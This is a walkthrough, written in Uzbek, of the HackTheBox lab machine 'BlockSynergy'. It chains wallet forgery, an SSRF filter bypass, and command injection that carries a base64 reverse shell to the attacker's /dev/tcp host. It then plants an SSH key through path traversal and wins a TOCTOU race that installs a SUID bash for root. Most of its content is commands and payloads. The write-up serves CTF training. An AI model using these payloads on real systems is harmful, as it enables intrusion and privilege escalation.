# BlockSynergy (HTB, Linux, Insane) — to'liq yechim yo'li

> Manbalar (internetdan topilgan ochiq writeup'lar):
> - https://github.com/0x0z0n/Research/tree/main/posts/BlockSynergy (eng to'liq, exploit skriptlar bilan)
> - https://github.com/DonMorpheus/ctf-toolkit/tree/main/htb/BlockSynergy (mexanizm tushuntirishi)
> - https://github.com/Frankishtien/Challenges-writeups-CTFS/blob/main/HTB/BlockSynergy.md (cmdi buyruqlari)
> - https://github.com/Aukovien/blog (qisman), https://github.com/LankylukeAus/lankylukeaus.github.io

## Umumiy zanjir (attack chain)

| # | Kim | Texnika | Natija |
|---|-----|---------|--------|
| 1 | - | Nmap | 22/tcp (OpenSSH 9.6p1) va 8080/tcp (Werkzeug/Flask) |
| 2 | - | `/blockchain` endpoint | Barcha tranzaksiyalar ochiq -> har bir public key balansi hisoblanadi |
| 3 | - | Wallet forgery | `private_key` va `public_key` alohida qabul qilinadi, mosligi tekshirilmaydi |
| 4 | VIP | Soxta VIP wallet | Eng boy public key + o'zimning private key -> VIP (0 mining) |
| 5 | VIP | SSRF | `test_node` `127.0.0.1`/`localhost` ni bloklaydi, `0.0.0.0` ni emas -> localhost-only `/admin` |
| 6 | VIP | URL-parser differensiali -> Command Injection | `ping_node` dagi `os.system("ping -w 4 " + userinfo)` |
| 7 | walter | RCE | `user.txt` |
| 8 | walter | Ichki servis | `127.0.0.1:5000` da 2-Flask app (hank sifatida) |
| 9 | walter | ContractEngine `debug`/`log` path traversal | `/home/hank/.ssh/authorized_keys` ga SSH key qo'shish |
| 10 | hank | SSH | Lateral movement |
| 11 | hank | `pspy64` | root cron: `backup.sh` -> FTP, `restore_daemon.sh` |
| 12 | hank | TOCTOU race | FTP'dagi arxiv checksum'dan keyin almashtiriladi |
| 13 | hank | Zararli SUID arxiv | root `tar xvf` bilan `/opt/blocksynergy/.diag` = `root:root 4755` |
| 14 | root | `bash -p` | `root.txt` |

---

## 1. Recon

```bash
nmap -sC -sV -p- <TARGET_IP>
# 22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
# 8080/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.3)
#                        http-title: BlockSynergy – Decentralized Future
```

Tashqaridan faqat 22 va 8080. Ichkarida `:5000` (localhost) bor (keyin SSRF bilan topiladi).

---

## 2. Wallet -> VIP (soxta reward)

### 2.1 Wallet yaratish va yuklash

```bash
curl -X POST http://<TARGET_IP>:8080/dashboard/wallet \
  -F "action=create" -F "filename=mywallet" -v
# javobda {public_key, private_key} JSON qaytadi

curl -X POST http://<TARGET_IP>:8080/dashboard/wallet \
  -F "action=load" -F "file=@wallet.json"
```

Muhim:
- Fayl maydoni **`file`** ( `wallet_file` emas).
- `create` sessiyani yuklamaydi — `load` qilish shart.
- VIP uchun **>= 10 coin** kerak, yangi walletda 0.


### 2.2 Balanslarni tiklash (ochiq chain)

```python
import requests, json
from collections import defaultdict
BASE = "http://<TARGET_IP>:8080"
s = requests.Session()
chain = s.get(f"{BASE}/blockchain").json()
balances = defaultdict(int)
for block in chain:
    for tx in block.get("data", []):
        if not isinstance(tx, dict) or "amount" not in tx: continue
        amt = int(tx["amount"])
        if tx.get("receiver"): balances[tx["receiver"]] += amt
        if tx.get("sender") and tx["sender"] != "Blockchain_Reward":
            balances[tx["sender"]] -= amt
vip_pub, vip_bal = max(balances.items(), key=lambda i: i[1])
print(vip_pub, vip_bal)
```

### 2.3 Soxta reward tranzaksiyasi

```bash
curl -X POST http://<TARGET_IP>:8080/broadcast_transaction \
  -H "Content-Type: application/json" \
  -d '{"sender":"Blockchain_Reward","receiver":"<PUB>","amount":20,"signature":"Blockchain"}'
```

- App `sender=Blockchain_Reward` + `signature=Blockchain` ga "mint" sifatida ishonadi.
- **Maydon nomi `receiver`** — `recipient` ishlatilsa chain buziladi (keyin VIP sahifalari 500).

### 2.4 Mining

- Block hash: `sha256(str(index)+str(previous_hash)+str(timestamp)+json.dumps(data)+str(nonce))`
- `index = last.index + 1`, `previous_hash = last.hash`
- VIP bo'lish uchun bir nechta blok qazish (writeup'da 5 TX / >=10 coin).

### 2.5 Soxta walletni yuklash (VIP)

```python
forged = {"private_key": fresh["private_key"], "public_key": vip_pub}
s.post(f"{BASE}/dashboard/wallet", data={"action":"load"},
       files={"file": ("f.json", json.dumps(forged), "application/json")})
# "Wallet loaded successfully"
```
`requests.Session()` ni keyingi qadamlar uchun saqlab qolish shart (holat sessiyaga bog'langan).

---

## 3. SSRF (VIP) -> localhost-only /admin

VIP node ro'yxatdan o'tkazadi va serverni test qilishga majbur qiladi:

```
POST /dashboard/vip/nodes            (action=register, node=<url>)
GET  /dashboard/vip/nodes/test_node/<NODE_ID>
```

- `127.0.0.1` / `localhost` bloklanadi, lekin **`0.0.0.0`** o'tadi.
- `http://0.0.0.0:8080/admin` -> admin dashboard (to'g'ridan-to'g'ri `/admin` esa 403).
- Node ID ni ro'yxatdan aniq qator bo'yicha topish kerak (pozitsiyaga ishonmang).

---

## 4. Command Injection -> RCE (walter)

`ping_node` handler: `os.system("ping -w 4 " + userinfo)`.
URL validator va bajaruvchi parser har xil -> differensial.

Zararli node URL (register paytida):

```
http://x;echo <BASE64>|base64 -d|bash;a@0.0.0.0:8080/
```

bu yerda base64 = `bash -c 'bash -i >& /dev/tcp/<TUN0_IP>/4444 0>&1'`

Trigger (SSRF orqali, GET query bilan):

```
http://0.0.0.0:8080/admin/nodes/manage?action=ping_node&target=http%3A%2F%2F<...>%3Becho%20<BASE64>%7Cbase64%20-d%7Cbash%3Ba%400.0.0.0%3A8080%2F
```

Natija: **walter** sifatida shell -> `/home/walter/user.txt`.

> Eslatma: `test_node` doim GET yuboradi (requests), POST bilan o'zgartirib bo'lmaydi.
> Ping'ni Kali'dan to'g'ridan-to'g'ri chaqirish 403 — SSRF orqali (localhost'dan) chaqirish kerak.

---

## 5. Ichki servis (port 5000) -> hank

walter shell'dan:

```bash
ss -tlnp
curl -s http://127.0.0.1:5000/ | head
```

`127.0.0.1:5000` da ikkinchi Flask app (ContractEngine) — **hank** sifatida ishlaydi.
Manba kod: `/opt/staging/smart_contracts/contract.py`, `dev_app.py`, `dev_blockchain.py`.

### Zaiflik: ContractEngine `debug`/`log` hook — path traversal

```python
logfile = f"/opt/staging/smart_contracts/logs/{file}"
with open(logfile, "a") as h: h.write(content)
```

`log_file` normalizatsiya qilinmaydi -> 4 marta `../` bilan root'ga chiqib, hank yoza oladigan faylga append:

```
../../../../home/hank/.ssh/authorized_keys
```

### Zararli contract

```bash
ssh-keygen -t ed25519 -f hank_key -N '' -C blocksynergy-writeup
```

`/tmp/hank_contract.json`:

```json
{
  "name": "ssh-bootstrap", "id": 1, "owner": "Developer",
  "debug": "True",
  "logic": {"mint": "allow"},
  "storage": {"balances": {}, "total_supply": 0},
  "hooks": {"on_mint": "log"},
  "__meta__": {
    "log_file": "../../../../home/hank/.ssh/authorized_keys",
    "log_content": {"on_mint": "\n<SSH_PUBLIC_KEY>\n"}
  }
}
```

### Upload + mint trigger (cookie uzluksizligi muhim)

```bash
curl -s -c /tmp/c.jar http://127.0.0.1:5000/dashboard >/dev/null
curl -s -b /tmp/c.jar -c /tmp/c.jar -F action=upload_contract \
     -F contract_file=@/tmp/hank_contract.json \
     http://127.0.0.1:5000/dashboard -o /tmp/up.html
grep -q 'Contract loaded' /tmp/up.html
curl -s -b /tmp/c.jar -c /tmp/c.jar -d action=contract_mint \
     -d contract_mint_amount=1 http://127.0.0.1:5000/dashboard -o /tmp/mint.html
```

### SSH (hank)

```bash
ssh -i hank_key -o IdentitiesOnly=yes hank@<TARGET_IP>
# hank "developers" guruhida
```

---

## 6. Root — restore TOCTOU race

### Daemon modeli (root)

1. `/opt/blocksynergy/restore` faylini ko'radi (hank `touch` qila oladi; katalog `developers` uchun rwx).
2. Ishonchli arxivni `/var/restore_work/_opt_blocksynergy.tar.gz` ga yuklaydi.
3. `sha256sum` (read-only fd).
4. **Aynan shu yo'lni qayta ochib**, root sifatida `tar xvf ... -C /` qiladi.

(3) va (4) orasida oyna bor. `IN_CLOSE_NOWRITE` (0x10) = sha256 fd'ni yopdi ->
`os.rename(payload, _opt_blocksynergy.tar.gz)` — bir xil FS'da **atomik almashtirish**.

### Payload: SUID bash

```bash
# tar a'zosini opt/blocksynergy/.diag ga aylantiradi, mode 4755, owner 0
tar --transform 's|.*|opt/blocksynergy/.diag|' --mode=4755 --owner=0 --group=0 \
    -cf suid.tar /bin/bash
# natija: -rwsr-xr-x root/root ... opt/blocksynergy/.diag
```

### Race

```bash
python3 race_watcher.py &      # AVVAL watcher (inotify)
touch /opt/blocksynergy/restore
# "[+] swapped!" kutiladi; tsikl ~daqiqalar. Swap tushmasa yana touch
```

### Root flag

```bash
ls -l /opt/blocksynergy/.diag     # -rwsr-xr-x 1 root root
/opt/blocksynergy/.diag -p        # uid=hank euid=0(root)
cat /root/root.txt
```

`-p` euid 0 ni saqlaydi. `-p`siz bash SUID'ni tashlab yuboradi.
FTP paroli kerak emas — daemon o'zi "trusted" tarni tortadi.

---

## 7. Boshi berk yo'llar (qaytmaslik uchun)

| Fikr | Haqiqat |
|------|---------|
| Kali'dan POST ping / XFF / Host: localhost | 403 |
| `gopher://` bilan `:5000` ga POST | `requests` gopher'ni bilmaydi |
| VIP `/smart_contracts` upload | stub "Coming soon" |
| `download_app` | "Currently unavailable" |
| Cookie'da JWT | 32-baytli Flask sessiya |
| `test_node` bilan multipart POST `:5000` | outbound baribir GET |
| `walter` ga SSH parol spray | rad etiladi; kirish = cmdi |
| `recipient` maydoni | VIP sahifalarni 500 qiladi |

---

## Tez replay

```bash
# Kali
nc -lvnp 4444
python3 exploit.py <TARGET_IP> <TUN0_IP> 4444     # wallet+VIP+SSRF+cmdi -> walter shell

ssh-keygen -t ed25519 -f hank_key -N ""
python3 plant_hank.py hank_key.pub > contract.json
# walter shell orqali 127.0.0.1:5000/dashboard ga upload + mint

ssh -i hank_key hank@<TARGET_IP>
bash make_suid_tar.sh
python3 race_watcher.py &
touch /opt/blocksynergy/restore
/opt/blocksynergy/.diag -p
cat /root/root.txt
```

